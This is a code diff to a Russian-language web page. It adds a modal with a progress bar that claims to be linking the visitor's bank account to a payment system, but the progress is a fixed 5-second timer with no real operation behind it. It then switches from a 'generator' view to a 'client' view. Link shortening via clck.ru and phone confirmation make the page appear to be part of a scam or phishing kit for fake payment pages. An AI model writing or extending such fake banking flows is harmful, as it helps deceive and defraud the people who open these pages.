@@ -410,6 +410,15 @@
             color: white;
         }
 
+        .loading-icon {
+            background: linear-gradient(135deg, #FF9800, #FFB74D);
+        }
+
+        .loading-icon i {
+            font-size: 35px;
+            color: white;
+        }
+
         .cancel-icon {
             background: #ffebee;
         }
@@ -545,6 +554,46 @@
         .btn-confirm:hover {
             background: linear-gradient(135deg, #45a049, #5cb860);
             transform: translateY(-3px);
+        }
+
+        /* Стили для прогресс-бара */
+        .progress-container {
+            margin: 30px 0;
+        }
+
+        .progress-text {
+            text-align: center;
+            margin-bottom: 10px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background-color: #e2e8f0;
+            border-radius: 10px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(135deg, #4CAF50, #66BB6A);
+            border-radius: 10px;
+            width: 0%;
+            transition: width 0.1s ease;
+        }
+
+        .progress-percentage {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
         }
 
         @media (max-width: 768px) {
@@ -717,6 +766,25 @@
         </div>
     </div>
 
+    <!-- Модальное окно загрузки -->
+    <div id="loadingModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-icon loading-icon">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <h2>Привязка счета</h2>
+            <p>Выполняется привязка вашего банковского счета к системе оплаты...</p>
+            
+            <div class="progress-container">
+                <div class="progress-text" id="progressText">Привязка счета: 0%</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                    <div class="progress-percentage" id="progressPercentage">0%</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- Модальное окно отмены -->
     <div id="cancelModal" class="modal">
         <div class="modal-content">
@@ -756,6 +824,7 @@
 
             // Модальные окна
             const confirmationModal = document.getElementById('confirmationModal');
+            const loadingModal = document.getElementById('loadingModal');
             const cancelModal = document.getElementById('cancelModal');
             const closeBtns = document.querySelectorAll('.close-btn');
             const callBtn = document.getElementById('callBtn');
@@ -765,6 +834,11 @@
             const confirmPhone = document.getElementById('confirmPhone');
             const confirmDate = document.getElementById('confirmDate');
             const confirmBtn = document.getElementById('confirmBtn');
+
+            // Элементы прогресс-бара
+            const progressText = document.getElementById('progressText');
+            const progressFill = document.getElementById('progressFill');
+            const progressPercentage = document.getElementById('progressPercentage');
 
             let currentLongUrl = '';
 
@@ -784,6 +858,36 @@
                 const month = String(date.getMonth() + 1).padStart(2, '0');
                 const year = date.getFullYear();
                 return `${day}.${month}.${year}`;
+            }
+
+            // Функция для анимации прогресс-бара
+            function startProgressAnimation() {
+                let progress = 0;
+                const duration = 5000; // 5 секунд
+                const interval = 50; // обновление каждые 50ms
+                const steps = duration / interval;
+                const increment = 100 / steps;
+
+                const timer = setInterval(() => {
+                    progress += increment;
+                    if (progress >= 100) {
+                        progress = 100;
+                        clearInterval(timer);
+                        
+                        // После завершения загрузки показываем финальную страницу
+                        setTimeout(() => {
+                            loadingModal.style.display = 'none';
+                            generatorContainer.style.display = 'none';
+                            clientContainer.style.display = 'flex';
+                        }, 500);
+                    }
+                    
+                    // Обновляем прогресс-бар
+                    progressFill.style.width = progress + '%';
+                    progressPercentage.textContent = Math.round(progress) + '%';
+                    progressText.textContent = `Привязка счета: ${Math.round(progress)}%`;
+                    
+                }, interval);
             }
 
             // Функция для сокращения ссылки через clck.ru
@@ -893,9 +997,11 @@
                 // Закрываем модальное окно подтверждения
                 confirmationModal.style.display = 'none';
                 
-                // Показываем финальную страницу
-                generatorContainer.style.display = 'none';
-                clientContainer.style.display = 'flex';
+                // Показываем модальное окно загрузки
+                loadingModal.style.display = 'flex';
+                
+                // Запускаем анимацию прогресс-бара
+                startProgressAnimation();
             });
 
             // Закрытие модальных окон
@@ -909,6 +1015,10 @@
             window.addEventListener('click', function(event) {
                 if (event.target === confirmationModal) {
                     confirmationModal.style.display = 'none';
+                }
+                if (event.target === loadingModal) {
+                    // Не закрываем окно загрузки по клику вне
+                    return;
                 }
                 if (event.target === cancelModal) {
                     cancelModal.style.display = 'none';
